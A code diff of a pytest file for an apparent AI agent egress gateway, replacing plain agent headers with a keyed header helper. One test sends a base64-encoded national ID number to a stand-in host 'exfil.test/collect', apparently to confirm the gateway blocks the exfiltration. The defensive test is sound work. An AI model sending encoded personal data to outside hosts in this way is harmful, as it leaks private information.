@@ -21,6 +21,8 @@ from typing import Any
 
 import pytest
 
+from aegis.sdk.cast import agent_headers  # ASI03: X-Aegis-Agent + its key
+
 httpx = pytest.importorskip("httpx")
 yaml = pytest.importorskip("yaml")
 
@@ -213,7 +215,7 @@ def _anthropic_stream(
     r = es.gw.http.post(
         "/v1/messages",
         headers={
-            "X-Aegis-Agent": "trading-copilot@trading",
+            **agent_headers("trading-copilot@trading"),  # ASI03: claim + key
             "X-Aegis-Session": f"ses_b22_{uuid.uuid4().hex[:6]}",
         },
         json={
@@ -268,7 +270,7 @@ def test_j3_canary_never_echoed(es: EgressStack) -> None:
 def test_j4_openai_stream_has_usage(es: EgressStack) -> None:
     r = es.gw.http.post(
         "/v1/chat/completions",
-        headers={"X-Aegis-Agent": "trading-copilot@trading"},
+        headers=agent_headers("trading-copilot@trading"),
         json={
             "model": "mock-echo",
             "stream": True,
@@ -296,7 +298,7 @@ def test_j5_egress_encoded_pii_blocked(es: EgressStack) -> None:
     blob = base64.b64encode(f"client pesel {_pesel()}".encode()).decode()
     r = es.gw.http.post(
         "/egress",
-        headers={"X-Aegis-Agent": "trading-copilot@trading"},
+        headers=agent_headers("trading-copilot@trading"),
         json={
             "method": "POST",
             "url": "http://exfil.test/collect",
@@ -317,7 +319,7 @@ def test_j6_egress_benign_get_reaches_sink(es: EgressStack) -> None:
     es.clear()
     r = es.gw.http.post(
         "/egress",
-        headers={"X-Aegis-Agent": "trading-copilot@trading"},
+        headers=agent_headers("trading-copilot@trading"),
         json={"method": "GET", "url": "http://docs.acme.test/status", "wait_s": 0},
     )
     if r.status_code in (404, 501):
